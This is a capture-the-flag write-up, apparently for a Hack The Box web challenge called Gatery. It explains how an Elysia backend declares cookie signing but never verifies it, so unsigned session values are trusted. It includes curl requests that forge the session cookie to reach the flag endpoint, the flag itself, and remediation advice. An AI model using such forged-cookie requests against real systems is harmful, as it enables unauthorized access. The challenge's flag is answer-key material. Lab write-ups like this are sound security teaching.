# Gatery
<img width="663" height="447" alt="Screenshot From 2026-07-31 10-23-49" src="https://github.com/user-attachments/assets/762c2952-1d6a-4af4-9ec5-e77196965f21" />  


## Writeup
<img width="1920" height="926" alt="image" src="https://github.com/user-attachments/assets/e0cd8711-40bf-40ef-9149-2b808621d2c9" />

**Gatery** is a small pixel-art browser game built with a React/Canvas frontend and a Bun + [Elysia](https://elysiajs.com/) backend. The story is simple: you control a character standing outside a castle gate. To get inside you need "gate authority" (i.e. you must log in as `admin`), then walk through the gate, talk to an NPC, and ask for the flag.

The interesting part of the challenge is entirely server-side, in how the application tracks authorization state between requests.

### Recon

The provided source included the full stack:

- `index.ts`: Elysia backend (auth, session, game state, flag endpoint)
- `App.jsx` / `main.jsx`: React game client
- `nginx.conf`, `supervisord.conf`, `Dockerfile`, `docker-compose.yml`: deployment/runtime config

Reviewing the infrastructure files first ruled out the easy wins: nginx only serves `/app/dist` as static content and reverse-proxies `/api/` to the Bun backend on `127.0.0.1:3000`; there's no directory listing, no exposed `.git`, and `/flag.txt` lives outside the web root, so it's not reachable directly. `supervisord.conf` just starts nginx and the Bun app — nothing leaks credentials there either.

That pointed the investigation squarely at `index.ts`.

### Application flow

The backend keeps authorization state in a single cookie, `session`, whose value can only ever be one of three things: unset, `'admin'`, or `'inside'`. The intended flow is:

```
POST /api/login       → validates username/password with bcrypt → session = "admin"
POST /api/gate/enter   → requires session ∈ {"admin","inside"}   → session = "inside"
POST /api/flag         → requires session === "inside"           → returns the flag
```

The `admin` account is provisioned at startup with a **random** password:

```ts
const adminPassword = randomBytes(24).toString('base64url')
const adminPasswordHash = await bcrypt.hash(adminPassword, 12)
```

It's never logged, printed, or exposed anywhere - so brute-forcing or guessing the login is not the intended path (and not feasible).

### The vulnerability

The Elysia app is initialized like this:

```ts
const app = new Elysia({
  cookie: {
    secrets: [sessionSecret],
    sign: [sessionCookie] // 'session'
  }
})
```

This *declares* that the `session` cookie should be cryptographically signed. However, none of the routes actually bind the cookie to a validated schema (e.g. `t.Cookie(...)` with the `sign` option) - they just destructure it directly:

```ts
.post('/api/flag', ({ cookie: { session }, set }) => {
  if (session.value !== 'inside') { ... }
  return { ok: true, flag }
})
```

Without a schema-level binding, Elysia never actually verifies the HMAC signature on incoming requests — `session.value` reflects whatever raw cookie string the client sends. The signing config exists, but it isn't enforced. In practice, the entire authorization model collapses to:

> *"If the client's `session` cookie equals the literal string `admin` or `inside`, grant access."*

There is no cryptographic barrier stopping a client from setting that string itself - the login flow (bcrypt password check) becomes entirely optional.

### Exploitation

No account, no password, no browser interaction needed - just set the cookie by hand and call the protected endpoints directly.

**1. Skip straight to the flag endpoint** by forging the `inside` state:

```bash
curl -i -X POST http://<target>:<port>/api/flag \
  -H "Content-Type: application/json" \
  -b "session=inside" \
  -d '{}'
```

That's it: this single request is enough to retrieve the flag. (For completeness, the intermediate step also works without ever logging in — forging `session=admin` and hitting `/api/gate/enter` transitions the forged cookie to `inside` exactly as if you'd logged in normally.)

```bash
curl -i -X POST http://<target>:<port>/api/gate/enter \
  -H "Content-Type: application/json" \
  -b "session=admin" \
  -d '{}'
```

**2. Result:**

```
HTTP/1.1 200 OK
Content-Type: application/json

{"ok":true,"flag":"HTB{w3lc0me_b3y0nd_th3_g4t3_2aa762f17ca5d2be14f452ada3011fbb}"}
```

Flag: **HTB{w3lc0me_b3y0nd_th3_g4t3_2aa762f17ca5d2be14f452ada3011fbb}**

### Root cause & remediation

- **Root cause:** cookie-signing configuration was declared at the application level but never actually applied to any route, so the "signed" session cookie was accepted unverified — effectively a broken authentication / access control flaw (equivalent to trusting a client-supplied role string).
- **Fix:** explicitly type the cookie in each route (or globally via a derived/guard) using Elysia's `t.Cookie(...)` schema with the `sign` option, so incoming cookies are actually verified against the HMAC secret and requests with an invalid/missing signature are rejected.
- **Secondary hardening:** even with signing enforced, storing a static role name (`"admin"` / `"inside"`) as the entire session payload is weak design — prefer an opaque, random, per-session identifier tied server-side to a user record, so the security of the whole system doesn't rest on a single shared HMAC secret.
